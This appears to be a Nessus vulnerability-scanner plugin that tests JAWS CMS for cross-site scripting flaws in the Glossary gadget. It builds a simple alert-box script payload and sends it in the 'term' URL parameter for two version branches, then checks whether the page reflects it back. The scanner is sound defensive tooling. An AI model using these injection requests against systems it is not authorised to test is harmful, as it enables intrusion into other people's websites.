#%NASL_MIN_LEVEL 70300
#
# This script was written by Josh Zlatin-Amishav
#
# This script is released under the GNU GPLv2.
#

# Changes by Tenable:
#   - added CVE xrefs.
#   - added details about the problem to the description.
#   - added See also and Solution.
#   - fixed script family.
#   - fixed exploit and extended it to cover versions 0.4.x.
#   - revised plugin title (4/30/09)
#   - changed cross site scripting to cross-site scripting (05/27/11)
#   - Fixed typos and added a CPE (10/08/12)

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(19394);
  script_version("1.23");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2005-1231", "CVE-2005-1800");
  script_bugtraq_id(13254, 13796);

  script_name(english:"JAWS Glossary Gadget Multiple XSS");

  script_set_attribute(attribute:"synopsis", value:
"A remote web application is vulnerable to cross-site scripting attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running JAWS, a content management system written in 
PHP.
The remote version of this software does not perform a proper validation
of user-supplied input to several variables used in the 
'GlossaryModel.php' script, and is, therefore, vulnerable to cross-site
scripting attacks.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2005/Apr/416");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2005/May/646");
  script_set_attribute(attribute:"solution", value:
"Upgrade to JAWS 0.5.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/04/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/08/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:jaws:jaws");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"Copyright (C) 2005-2022 Josh Zlatin-Amishav");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

port = get_http_port(default:80, embedded:TRUE);
if(!get_port_state(port))exit(0);
if ( get_kb_item("www/"+port+"/generic_xss") ) exit(0);
if(!can_host_php(port:port)) exit(0);

# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + "');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = urlencode(str:xss);


# Exploits
exploits = make_list(
  # for 0.5.x
  string("gadget=Glossary&action=ViewTerm&term=", exss),
  # for 0.4.x
  string("gadget=Glossary&action=view&term=", exss)
);


foreach dir ( cgi_dirs() ) {
  foreach exploit (exploits) {
    req = http_get(item:string(dir, "/index.php?", exploit), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    if (
      'Term does not exists' >< res && 
      xss >< res
    ) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }
}
